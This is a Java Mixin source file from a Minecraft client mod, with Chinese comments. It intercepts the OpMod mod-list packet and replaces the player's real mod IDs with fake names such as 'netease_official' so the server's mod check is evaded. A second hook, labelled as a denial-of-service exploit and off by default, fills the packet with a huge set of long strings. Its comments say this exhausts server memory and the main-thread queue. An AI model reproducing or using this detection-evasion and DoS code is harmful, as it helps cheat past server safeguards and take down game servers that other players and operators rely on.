package fku.org.example.fku.mixin; /* water */

import fku.org.example.fku.config.OpmodBypassConfig;
import fku.org.example.fku.config.OpmodDosConfig;
import fku.org.example.fku.util.ModScanResult;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Pseudo;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.jar.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
//绕过opmod的发包 功能 来自：Karucn / jks
//优化by：水是什么味道的，加入了列表对比，完全绕过opmod，不会播报了。

/**
 * 绕过 OpMod 的模组列表检测。
 *
 * 对比两个目录的 modId：
 *   列表1 = 客户端本地模组目录（可在 fku/opmod_bypass.json 中配置）
 *   列表2 = 服务器自动安装的模组目录（可在 fku/opmod_bypass.json 中配置）
 * 仅当某 mod 同时出现在两个目录中，且目录2 中该 mod 的出现次数 ≤ 目录1 的出现次数时，才伪装。
 * 如果目录2 中的出现次数严格大于目录1（即用户多装了副本），则保留真实 ID，不伪装。
 * 该功能由赛博教员实现
 */
@Pseudo
@Mixin(targets = "lbxrman.mymod.opmod.network.PacketSendModList", remap = false)
public abstract class MixinPacketSendModList {

    @Shadow private Set<String> modIds;

    /** 伪装用的候选 modId（轮询使用） */
    private static final String[] FAKE_MOD_IDS = {"netease_official", "opmod"};

    /**
     * 依赖型 / jarjar 内嵌子 mod 白名单。
     *
     * 这些 modId 通常由父 mod 通过 META-INF/jarjar 内嵌打包（例如 Puzzles Lib 内嵌
     * puzzlesaccessapi，MixinExtras 被 relocate 进各种 mod），本身是父 mod 的依赖，
     * 不是玩家独立安装的 mod，且在服主/玩家两侧暴露不一致时会被 OpMod 误判为
     * "多出模组 / 缺少模组"。
     *
     * 伪装逻辑遇到这些 id 时强制替换（不受目录 count 比较限制），使玩家上报列表里
     * 绝不携带它们，OpMod 的差集计算便不会把它们算作差异。服主侧若也使用本伪装逻辑，
     * 同样会替换掉这些 id，两侧对称 → 不再播报。
     */
    private static final Set<String> EMBEDDED_DEPENDENCY_MODIDS = new HashSet<>(java.util.Arrays.asList(
            "puzzlesaccessapi",
            "mixinextras",
            "mixinextrasforge",
            "kotlinforforge",
            "xaerolib"
    ));

    /** 默认目录1（回退值） */
    private static final String DEFAULT_DIR_1 = "D:\\MCLDownload\\cache\\game\\V_1_20\\mods";
    /** 默认目录2（回退值） */
    private static final String DEFAULT_DIR_2 = "D:\\MCLDownload\\Game\\.minecraft\\mods";

    /** mods.toml 中提取 modId 的正则 */
    private static final Pattern MODID_PATTERN = Pattern.compile("modId\\s*=\\s*\"([^\"]+)\"");

    /** 缓存：目录1 的扫描结果 */
    private static ModScanResult cachedResult1 = null;
    /** 缓存：目录2 的扫描结果 */
    private static ModScanResult cachedResult2 = null;

    @Inject(method = "<init>(Ljava/util/Set;)V", at = @At("RETURN"), remap = false)
    private void onInit(Set<String> originalModIds, CallbackInfo ci) {
        try {
            if (modIds == null) return;
            if (originalModIds == null || originalModIds.isEmpty()) return;

            // 从配置读取目录路径（读取失败时回退到默认 D 盘路径）
            String dir1 = DEFAULT_DIR_1;
            String dir2 = DEFAULT_DIR_2;
            try {
                OpmodBypassConfig cfg = OpmodBypassConfig.getInstance();
                dir1 = cfg.modsDir1;
                dir2 = cfg.modsDir2;
            } catch (Exception ignored) {}

            // 扫描两个目录
            ModScanResult result1 = scanModsDir(Paths.get(dir1));
            ModScanResult result2 = scanModsDir(Paths.get(dir2));

            // 遍历原始列表
            //   仅当 mod 同时存在于两个目录中，且目录2 的出现次数 ≤ 目录1 的出现次数 → 伪装
            //   如果目录2 的出现次数严格大于目录1（用户多装了副本），则保留真实 ID
            //   其余情况均保留真实 ID
            List<String> originalList = new ArrayList<>(originalModIds);
            Set<String> result = new TreeSet<>();
            int fakeIdx = 0;
            for (String id : originalList) {
                // 合并主 mod 与 jarjar 内嵌 mod 的总出现次数
                int count1 = result1.mainMods.getOrDefault(id, 0) + result1.jarjarMods.getOrDefault(id, 0);
                int count2 = result2.mainMods.getOrDefault(id, 0) + result2.jarjarMods.getOrDefault(id, 0);

                // 目录2 有该 mod 且目录2 的个数 ≤ 目录1 的个数 → 伪装
                // 内嵌依赖型 modId（jarjar 子 mod 等）强制伪装，避免被 OpMod 误判为差异
                //   1) 出现在 EMBEDDED_DEPENDENCY_MODIDS 白名单
                //   2) 出现在任一目录的 jarjarMods（即由某父 mod 通过 META-INF/jarjar 内嵌打包）——
                //      自动覆盖 kotlinforforge / xaerolib / puzzlesaccessapi 等所有内嵌子 mod，
                //      不再依赖 count 比较的边界，彻底规避"内嵌 mod 时好时坏漏伪装"的问题
                boolean isEmbedded = result1.jarjarMods.containsKey(id) || result2.jarjarMods.containsKey(id);
                boolean shouldSpoof = isEmbedded
                        || EMBEDDED_DEPENDENCY_MODIDS.contains(id)
                        || (count2 > 0 && count2 <= count1);

                if (shouldSpoof) {
                    result.add(FAKE_MOD_IDS[fakeIdx % FAKE_MOD_IDS.length]);
                    fakeIdx++;
                } else {
                    result.add(id);
                }
            }

            // 替换原列表
            modIds.clear();
            modIds.addAll(result);
        } catch (Throwable t) {
            // 任何异常都不应阻断加入流程：保留原列表即可。
        }
    }

    /**
     * OpMod DoS 利用（巨型 mod 列表攻击）。
     * 在伪装逻辑（onInit）执行完之后追加：当 opmod_dos.json 中 modListAttack 开启时，
     * 把 modIds 替换为一个“自报 size 巨大 + 单条字符串超长”的集合，
     * 服务端 decode 会按客户端自报的 size 预分配几十 MB 的 TreeSet，
     * 且每个包都会被 enqueueWork 推入主线程队列做差集 + 全服广播，形成无界队列堆积 → DoS。
     * 默认关闭，手动改 opmod_dos.json 才生效；不动原有伪装逻辑。
     */
    @Inject(method = "<init>(Ljava/util/Set;)V", at = @At("RETURN"), remap = false)
    private void onInitAttack(Set<String> originalModIds, CallbackInfo ci) {
        try {
            OpmodDosConfig cfg = OpmodDosConfig.getInstance();
            if (cfg == null || !cfg.modListAttack) return;
            if (modIds == null) return;

            int size = Math.max(1, cfg.modListSize);
            int strLen = Math.max(1, cfg.modListStringLen);
            StringBuilder sb = new StringBuilder(strLen);
            for (int i = 0; i < strLen; i++) sb.append((char) ('a' + (i % 26)));
            String base = sb.toString();

            Set<String> attack = new TreeSet<>();
            for (int i = 0; i < size; i++) {
                attack.add(base + "_" + i);
            }
            modIds.clear();
            modIds.addAll(attack);
        } catch (Throwable t) {
            // 不阻断正常流程
        }
    }

    /**
     * 扫描指定目录下的 .jar 文件，提取所有 modId（含 jarjar 内嵌），返回分离的扫描结果
     */
    private static ModScanResult scanModsDir(Path dir) {
        // 用目录路径做缓存键，各自缓存独立判空
        String dirKey = dir.toAbsolutePath().normalize().toString();
        if (dirKey.contains("cache") && cachedResult1 != null) return cachedResult1;
        if (dirKey.contains("minecraft") && cachedResult2 != null) return cachedResult2;

        ModScanResult result = new ModScanResult();
        if (!Files.isDirectory(dir)) return result;

        try (DirectoryStream<Path> stream = Files.newDirectoryStream(dir, "*.jar")) {
            for (Path jarPath : stream) {
                try {
                    scanSingleJar(jarPath, result, 0);
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}

        // 缓存结果
        if (dirKey.contains("cache")) cachedResult1 = result;
        if (dirKey.contains("minecraft")) cachedResult2 = result;
        return result;
    }

    /**
     * 扫描单个 jar：提取主 modId、递归提取内层 jarjar/jars 内嵌 modId，
     * 并累加该 jar（含其所有内层 jar）是否携带 MixinExtras 的标志。
     *
     * @param depth 递归深度，防止极端嵌套导致栈溢出
     */
    private static void scanSingleJar(Path jarPath, ModScanResult result, int depth) {
        try (JarFile jar = new JarFile(jarPath.toFile())) {
            // 1) 主 modId（顶层 mods.toml，可能多个 [[mods]]）
            //    depth>0 表示这是某个父 mod 通过 META-INF/jarjar 内嵌的子 jar，
            //    其 modId 视为"内嵌依赖"，同时记入 mainMods（保持既有计数对比行为）
            //    与 jarjarMods（供 isEmbedded 强制伪装判定使用）
            for (String mid : extractAllModIdsFromJar(jar)) {
                result.mainMods.merge(mid, 1, Integer::sum);
                if (depth > 0) {
                    result.jarjarMods.merge(mid, 1, Integer::sum);
                }
            }
            // 2) 本 jar 是否携带 MixinExtras（顶层 namelist 即可判断，覆盖 relocate 包路径 / services 标识）
            if (jarCarriesMixinExtras(jar)) {
                result.hasMixinExtras = true;
            }
            // 3) 递归扫描内层 jar（META-INF/jarjar/* 与 META-INF/jars/*），解开后再扫其中的 jarjar
            List<JarEntry> innerJars = new ArrayList<>();
            Enumeration<JarEntry> entries = jar.entries();
            while (entries.hasMoreElements()) {
                JarEntry e = entries.nextElement();
                String name = e.getName();
                if (!e.isDirectory()
                        && (name.startsWith("META-INF/jarjar/") || name.startsWith("META-INF/jars/"))
                        && name.endsWith(".jar")) {
                    innerJars.add(e);
                }
            }
            for (JarEntry innerEntry : innerJars) {
                try (InputStream is = jar.getInputStream(innerEntry);
                     java.util.zip.ZipInputStream zis = new java.util.zip.ZipInputStream(is)) {
                    // 把内层 jar 内容抽到一个临时文件再递归扫描，避免 ZipInputStream 不可随机访问
                    Path tmp = Files.createTempFile("fku_jarjar_", ".jar");
                    try {
                        Files.copy(zis, tmp, StandardCopyOption.REPLACE_EXISTING);
                        if (depth < 6) scanSingleJar(tmp, result, depth + 1);
                    } finally {
                        try { Files.deleteIfExists(tmp); } catch (Exception ignored) {}
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    /**
     * 可靠检测一个 jar 是否携带 MixinExtras，覆盖以下情形：
     *   1) 原始包路径 ca/spottedleaf/mixinextras/
     *   2) 被重定位（relocate）后的任意包路径，如 ca/fxco/memoryleakfix/mixinextras/（按 "mixinextras/" 段匹配）
     *   3) 含 mixinextras 的内嵌 jar 文件名，如 mixinextras-forge-*.jar / mixinextras-*.jar
     *   4) META-INF/services/org.spongepowered.asm.service.mixin.IMixinService 内容含 MixinExtrasService
     */
    private static boolean jarCarriesMixinExtras(JarFile jar) {
        boolean servicesHit = false;
        Enumeration<JarEntry> entries = jar.entries();
        while (entries.hasMoreElements()) {
            JarEntry e = entries.nextElement();
            String name = e.getName();
            // (1)(2) 任意包路径下出现 mixinextras/ 子目录段
            if (name.contains("mixinextras/")) {
                return true;
            }
            // (3) 内嵌 jar 文件名含 mixinextras（如 META-INF/jarjar/mixinextras-forge-0.4.0.jar）
            int slash = name.lastIndexOf('/');
            String fileName = slash >= 0 ? name.substring(slash + 1) : name;
            if (fileName.contains("mixinextras") && fileName.endsWith(".jar")) {
                return true;
            }
            // (4) 收集 services 文件稍后读内容判断
            if (name.equals("META-INF/services/org.spongepowered.asm.service.mixin.IMixinService")) {
                servicesHit = true;
            }
        }
        if (servicesHit) {
            try {
                JarEntry se = jar.getJarEntry("META-INF/services/org.spongepowered.asm.service.mixin.IMixinService");
                if (se != null) {
                    try (BufferedReader r = new BufferedReader(
                            new InputStreamReader(jar.getInputStream(se), StandardCharsets.UTF_8))) {
                        String line;
                        while ((line = r.readLine()) != null) {
                            if (line.contains("MixinExtrasService")) {
                                return true;
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}
        }
        return false;
    }

    /**
     * 从已打开的 jar 中读取 META-INF/mods.toml，提取所有 [[mods]] 下的 modId
     * （一个 mods.toml 中可能包含多个 [[mods]] 条目，如 setcommandblock + filterdetector）
     */
    private static Set<String> extractAllModIdsFromJar(JarFile jar) {
        Set<String> result = new HashSet<>();
        try {
            JarEntry entry = jar.getJarEntry("META-INF/mods.toml");
            if (entry == null) return result;

            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(jar.getInputStream(entry), StandardCharsets.UTF_8))) {
                String line;
                boolean inModsSection = false;
                while ((line = reader.readLine()) != null) {
                    String trimmed = line.trim();
                    // 进入 [[mods]] 区块
                    if (trimmed.startsWith("[[mods]]")) {
                        inModsSection = true;
                        continue;
                    }
                    // 进入其他区块（[[dependencies.xxx]] 等），退出 mods 模式
                    if (trimmed.startsWith("[[")) {
                        inModsSection = false;
                    }
                    if (inModsSection) {
                        Matcher m = MODID_PATTERN.matcher(trimmed);
                        if (m.find()) {
                            result.add(m.group(1));
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        return result;
    }
}